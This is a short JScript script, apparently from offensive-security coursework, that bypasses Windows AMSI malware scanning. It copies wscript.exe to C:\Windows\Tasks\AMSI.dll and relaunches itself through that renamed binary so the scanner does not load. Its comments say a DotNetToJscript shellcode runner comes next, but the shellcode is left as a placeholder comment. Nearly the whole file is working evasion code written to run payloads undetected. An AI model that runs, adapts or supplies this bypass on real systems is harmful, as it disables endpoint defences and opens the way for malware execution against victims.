var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');

//detect if copied exe already exusts, if yesm we run the DotNetToJscript-generated
// shellcode runner.
try
{
  if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
  {
    throw new Error(1, '');
  }
}
//catch,  opy wscript.exe into the C:\Windows\Tasks folder and name it “AMSI.DLL”.
catch(e)
{
  filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
  
  //use the Exec method to execute the copied version of wscript.exe and again process it as a Jscript file,
  sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
  WScript.Quit(1);
}

//full shell code following here